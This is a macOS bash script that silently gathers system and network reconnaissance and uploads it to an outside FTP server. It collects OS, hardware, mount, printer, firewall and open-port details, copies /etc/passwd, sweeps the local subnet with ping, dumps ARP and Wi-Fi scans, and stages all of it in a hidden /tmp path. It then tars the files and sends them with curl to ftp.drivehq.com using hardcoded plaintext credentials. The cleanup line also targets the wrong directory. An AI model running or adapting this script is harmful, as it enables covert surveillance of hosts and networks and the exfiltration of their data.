#!/bin/bash
# The script will grab, save and upload to a FTP/SCP server
# Should work on any MacOs device
# Admin access is not required


# FTP Server
FTP_SERVER="ftp.drivehq.com"

# FTP Credential
USER="medunno"
PASSWORD="@Security@"

INFO_DIR="/tmp/.p/.w/.n/.d/"

mkdir -p $INFO_DIR 

get_os() {
	system_profiler SPSoftwareDataType > $INFO_DIR/os_details.txt
}

get_hardware() {
	system_profiler SPHardwareDataType > $INFO_DIR/hardware.txt
}

get_mounts() {
  mount > $INFO_DIR/mounts.txt
}

get_printer() {
	system_profiler SPPrintersDataType > $INFO_DIR/printers.txt
}

get_network() {
	system_profiler SPNetworkLocationDataType > $INFO_DIR/network.txt 
}

get_ports() {
	lsof -Pn -i4 | grep -i listen > $INFO_DIR/open_ports.txt 
}

get_firewall() {
	system_profiler SPFirewallDataType > $INFO_DIR/firewall.txt
}

get_graphics() {
  system_profiler SPDisplaysDataType > $INFO_DIR/graphics.txt
}

get_passwd() {
  cat /etc/passwd > $INFO_DIR/passwd.txt
}

get_external() {
  curl -s ipinfo.io | sed 's/}//;s/{//' > $INFO_DIR/external_geo_ip.txt
}

get_subnet_ips() {
	for i in {1..254} ; do (ping -c 1 192.168.1.$i | grep 'bytes from' &) ; done > $INFO_DIR/subnet_ping_scan.txt 
}

get_arp() {
 arp -a > $INFO_DIR/arp.txt	
}

get_wifi() {
  /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 scan > $INFO_DIR/wifi_networks.txt
}

# Add/Remove functions
get_os
get_hardware
get_mounts
get_printer
get_network
get_firewall
get_ports
get_graphics
get_passwd
get_external
get_subnet_ips
get_arp
get_wifi

# Upload results
cd $INFO_DIR
tar cfz $(hostname)_$(whoami)_sysinfo.tgz *.txt > /dev/null
curl -sT $INFO_DIR/$(hostname)_$(whoami)_sysinfo.tgz ftp://${FTP_SERVER} --user ${USER}:${PASSWORD}

# Cleanup
rm -rf /tmp/p
